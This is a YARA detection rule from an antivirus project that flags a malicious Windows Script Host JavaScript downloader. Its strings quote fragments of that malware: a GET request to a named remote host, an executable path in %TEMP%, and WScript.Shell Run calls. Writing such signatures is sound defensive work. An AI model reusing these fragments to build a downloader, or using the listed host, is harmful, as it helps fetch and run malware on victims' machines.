rule sig_20160329_0f65e0ca18949101237c616b1f059d48 {
  meta:
    description = "datamaliciousorder - file 20160329_0f65e0ca18949101237c616b1f059d48.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f76a10828316917d3fab93d70b8ac0f93c46cd2230f2ca5c4c5d4d9630129295"

  strings:
    $s1  = "J[CC](\"GET\", \"http://www.the2ndedit.com/j1oisa\", false);" fullword ascii
    $s2  = "function LJ() {return r[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Rd0rCZVg2110be.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[I](Vb() * 11); if (J[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var r = function Cm() {return WScript[j](\"WScript.Shell\");}(), DE = 11;" fullword ascii
    $s5  = "function o(UN, Jb){E = E * 1; return UN - Jb;};" fullword ascii
    $s6  = "function l(){return \"\" + uf;};" fullword ascii
    $s7  = "function Au() {return ((f == true) && (f == Y)) ? 1 : E;};" fullword ascii
    $s8  = "function n(ot){r[\"Run\"](ot, E, E);};" fullword ascii
    $s9  = "function T()" fullword ascii
    $s10 = "function Vk(){return j;};" fullword ascii
    $s11 = "var z = new this[\"Date\"]();" fullword ascii
    $s12 = "return o(b, k);" fullword ascii
    $s13 = "function Vb(){return 22;};" fullword ascii
    $s14 = " while (QP){" fullword ascii
    $s15 = "function G(h) {var j0 = (1, 2, 3, 4, 5, h); return j0;};" fullword ascii
    $s16 = "Y = true; " fullword ascii
    $s17 = "var Y = false;" fullword ascii
    $s18 = "var f = false;" fullword ascii
    $s19 = "f = true; " fullword ascii
    $s20 = "var RW = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}